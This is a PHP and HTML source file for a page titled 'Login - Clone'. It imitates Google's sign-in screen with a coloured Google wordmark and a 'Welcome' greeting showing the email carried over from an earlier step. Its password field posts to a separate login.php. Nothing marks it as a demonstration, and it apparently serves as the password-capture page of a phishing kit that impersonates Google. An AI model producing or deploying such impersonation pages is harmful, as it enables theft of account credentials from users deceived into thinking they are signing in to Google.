<?php
session_start(); // Start the session

// Check if email is set
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $_SESSION['email'] = $_POST['email']; // Store the email in the session
} else {
    // Redirect back to email input if email is not set
    header("Location: email.php");
    exit();
}
?>
<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email from the POST data
    $email = htmlspecialchars($_POST['email']); // Use htmlspecialchars to prevent XSS
} else {
    // Redirect back to the form if the email isn't set
    header("Location:index.html");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Login - Clone</title>
      <style>
 .container {
        width: 400px; /* Adjust the width as needed */
        height: 450px; /* Set a fixed height for the container */
        padding: 20px; /* Add padding for space inside the container */
        margin: 0 auto; /* Center the container */
        border: 1px solid #ccc; /* Optional: border style */
        border-radius: 8px; /* Optional: rounded corners */
        background-color: #f9f9f9; /* Optional: background color */
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Optional: shadow for depth */
        position: relative; /* Make it a positioning context for child elements */
    }
    input[type="email"], 
    input[type="password"] {
        width: 400px; /* Make the input take the full width of the container */
        height: 55px; /* Set a specific height for the input box */
        padding: 10px; /* Add padding inside the input for better usability */
        margin-bottom: 10px; /* Space below the input */
        border: 1px solid #ccc; /* Border style */
        border-radius: 4px; /* Rounded corners for the input */
    }
    
     .button-container {
        display: flex; /* Use flexbox for alignment */
        justify-content: space-between; /* Space between button and link */
        align-items: center; /* Center vertically */
        margin-top: -15px; /* Space above the button */
    }
     .forget-container {
        display: flex; /* Use flexbox for alignment */
        justify-content: space-between; /* Space between button and link */
        align-items: center; /* Center vertically */
        margin-top: -50px; /* Space above the button */
    }
     button {
        width:17%;
        position: absolute; /* Position it absolutely within the container */
        bottom: 50px; /* Distance from the bottom */
        right: 40px; /* Distance from the right */
        padding: 10px 1px; /* Adjusted padding for a smaller button */
        border: none; /* Remove border */
        border-radius: 4px; /* Rounded corners for the button */
        background-color: #4285F4; /* Button color */
        color: white; /* Text color */
        cursor: pointer; /* Pointer on hover */
        font-size: 14px; /* Optional: adjust font size */
    }
    button:hover {
        background-color: #357AE8; /* Darker shade on hover */
    }
    body {
        font-family: Arial, sans-serif;
    }
</style>
    <style>
    .google-logo {
        display: flex; /* Aligns the letters in a row */
        justify-content: center; /* Center the text */
        font-size: 25px; /* Increase font size */
        font-weight: lighter; /* Make the text bold */
        margin-bottom: 20px; /* Space below the logo */
         margin-top:20px;
    }
</style>
 <style>
     body {
            display: flex; /* Use flexbox for the body */
            justify-content: center; /* Center horizontally */
            align-items: center; /* Center vertically */
            height: 100vh; /* Full viewport height */
            margin: 0; /* Remove default margin */
        }

        .container {
            text-align: center; /* Center text inside the container */
        }
           html, body {
            height: 100%; /* Ensure full height */
            margin: 0; /* Remove default margin */
        }

        body {
            display: flex; /* Use flexbox for the body */
            justify-content: center; /* Center horizontally */
            align-items: center; /* Center vertically */
        }

        .container {
            text-align: center; /* Center text inside the container */
            height:74%;
            width: 400px; /* Set a width for the container */
        }

        .email-box {
            display: flex; /* Use flexbox for alignment */
            align-items: center; /* Center the icon and text vertically */
            border: 1px solid #ccc; /* Border color */
            border-radius: 12px; /* Rounded corners */
            padding: 5px 10px; /* Padding for the box */
            margin-bottom: 20px; /* Space below the box */
            font-size: 14px; /* Smaller font size for the email */
            background-color: transparent; /* No background color */
            max-width: 230px; /* Max width for the box */
            margin: 0 auto; /* Center the box horizontally */
        }
        
        .profile-icon {
            width: 30px; /* Width of the icon */
            height: 30px; /* Height of the icon */
            border-radius: 50%; /* Make it circular */
            border: 2px solid #ccc; /* Thin grey border */
            display: flex; /* Flexbox for centering */
            align-items: center; /* Center vertically */
            justify-content: center; /* Center horizontally */
            margin-right: 10px; /* Space between the icon and text */
            background-color: white; /* Background color for the icon */
        }

        .material-icons {
            font-size: 24px; /* Size of the icon */
            color: #4285F4; /* Icon color */
        }
    </style>
</head>
<body>
    <div class="container">
       <div class="google-logo">
            <span style="color: #4285F4;">G</span>
            <span style="color: #EA4335;">o</span>
            <span style="color: #FBBC05;">o</span>
            <span style="color: #4285F4;">g</span>
            <span style="color: #34A853;">l</span>
            <span style="color: #EA4335;">e</span>
        </div>
        <!-- Email display box with icon -->
          <!-- Email display box with icon -->
          <lighter><h3>Welcome</h3></lighter>
        <div class="email-box">
            <div class="profile-icon">
           
            </div>
 <light><?php echo $email; ?></light>
        </div>
        <br>
        <br>
        <br>
        
        <form action="login.php" method="POST">
         <input type="password" id="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
        <footer>
            <p><a href="#">Forgot email?</a></p>
            <p><a href="#">Need help?</a></p>
        </footer>
    </div>
</body>
</html>
